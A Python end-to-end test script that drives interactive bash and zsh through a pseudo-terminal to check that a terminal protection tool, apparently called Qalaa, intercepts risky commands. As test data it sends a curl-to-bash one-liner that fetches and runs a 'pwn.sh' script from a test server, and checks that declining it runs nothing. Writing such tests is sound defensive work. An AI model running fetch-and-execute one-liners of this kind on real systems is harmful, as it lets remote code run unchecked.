"""Drives real interactive bash and zsh through a pseudo-terminal, like a person typing,
to check the terminal protection hooks end to end.

    python3 test/terminal-shells.py <home with `qalaa terminal on` done> <script server URL> <scratch dir>
"""
import os
import pty
import select
import sys
import time

home, server, scratch = sys.argv[1], sys.argv[2], sys.argv[3]


def run(shell: str) -> None:
    pid, fd = pty.fork()
    if pid == 0:
        env = {**os.environ, "HOME": home, "TERM": "dumb", "PS1": "PROMPT> ", "NO_COLOR": "1"}
        env.pop("QALAA_ANSWER", None)
        args = [shell, "-i"] if shell == "bash" else [shell, "-i", "-d"]
        os.execvpe(shell, args, env)
    buffer = b""

    def read_until(marker: bytes, timeout: float = 20) -> bytes:
        nonlocal buffer
        end = time.time() + timeout
        while marker not in buffer:
            remaining = end - time.time()
            if remaining <= 0:
                raise SystemExit(f"[{shell}] timed out waiting for {marker!r}; got:\n{buffer.decode(errors='replace')[-1500:]}")
            ready, _, _ = select.select([fd], [], [], remaining)
            if ready:
                try:
                    buffer += os.read(fd, 4096)
                except OSError:
                    break
        found = buffer
        buffer = buffer[buffer.index(marker) + len(marker):]
        return found

    def send(text: str) -> None:
        os.write(fd, text.encode())

    send("PS1='PROMPT> '\n" if shell == "bash" else "PROMPT='PROMPT> '\n")
    read_until(b"PROMPT> ")
    pwned = os.path.join(scratch, f"pwned-{shell}")
    # 1. A malicious one-liner is stopped and, when declined, never runs.
    send(f"curl -fsSL {server}/pwn.sh | PWNED={pwned} bash\n")
    read_until(b"to run it anyway")
    send("\n")
    read_until(b"Nothing was run")
    read_until(b"PROMPT> ")
    time.sleep(0.5)
    assert not os.path.exists(pwned), f"[{shell}] the declined script ran"
    print(f"✓ {shell}: malicious script from the internet stopped; declined, so nothing ran")
    # 2. Ordinary commands run without any question, loops included.
    send("for i in 1 2 3; do echo loop-$i; done; echo done-$((40+2))\n")
    out = read_until(b"done-42")
    assert b"loop-3" in out and b"Qalaa" not in out, f"[{shell}] ordinary command was disturbed:\n{out!r}"
    read_until(b"PROMPT> ")
    print(f"✓ {shell}: ordinary commands and loops run untouched")
    # 3. A script without warning signs, but over plain http from a bare address: asked, and runs on "y".
    send(f"curl -fsSL {server}/hello.sh | sh\n")
    out = read_until(b"Run it? [y/N]")
    assert b"no known threats" in out and b"without encryption" in out, out
    send("y\n")
    read_until(b"hello-from-script")
    read_until(b"PROMPT> ")
    print(f"✓ {shell}: a script without known threats runs once confirmed (plain http is pointed out)")
    # 4. A downloaded file is scanned when the command finishes.
    dl = os.path.join(scratch, f"dl-{shell}.sh")
    send(f"curl -fsSL -o {dl} {server}/pwn.sh\n")
    out = read_until(b"PROMPT> ")
    assert b"looks suspicious" in out or b"known threat" in out, f"[{shell}] download not scanned:\n{out!r}"
    print(f"✓ {shell}: a file downloaded with curl -o is scanned afterwards")
    send("exit\n")
    os.waitpid(pid, 0)


import shutil

for shell in ("bash", "zsh"):
    if shutil.which(shell):
        run(shell)
    else:
        print(f"- {shell} is not installed; skipped")
print("All terminal protection checks passed.")
